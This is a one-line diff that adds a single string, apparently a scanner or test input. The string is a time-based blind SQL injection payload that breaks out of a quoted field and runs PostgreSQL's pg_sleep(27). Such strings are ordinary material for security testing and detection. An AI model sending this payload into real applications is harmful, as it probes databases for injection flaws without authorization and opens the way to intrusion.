@@ -1,0 +1,1 @@
+LfjtVzn0';select pg_sleep(27); -- 
